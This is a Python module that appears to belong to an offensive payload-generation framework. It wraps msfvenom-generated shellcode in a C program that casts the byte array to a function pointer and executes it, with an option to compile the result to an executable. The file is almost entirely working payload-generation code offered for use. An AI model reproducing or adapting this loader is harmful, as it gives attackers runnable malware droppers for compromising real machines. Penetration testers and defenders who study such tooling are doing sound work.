"""

Simple C void * shellcode invoker.

Code adapted from:
https://github.com/rapid7/metasploit-framework/blob/master/data/templates/src/pe/exe/template.c


module by @christruncer

"""

from modules.common import shellcode
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required options
        self.description = "C VoidPointer cast method for inline shellcode injection"
        self.language = "c"
        self.rating = "Poor"
        self.extension = "c"
        
        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}

    def generate(self):
        
        # Generate Shellcode Using msfvenom
        Shellcode = self.shellcode.generate()

        # Generate Random Variable Names
        RandShellcode = helpers.randomString()
        RandReverseShell = helpers.randomString()
        RandMemoryShell = helpers.randomString()

        # Start creating our C payload
        PayloadCode = 'unsigned char payload[]=\n'
        PayloadCode += '\"' + Shellcode + '\";\n'
        PayloadCode += 'int main(void) { ((void (*)())payload)();}\n'
        
        return PayloadCode
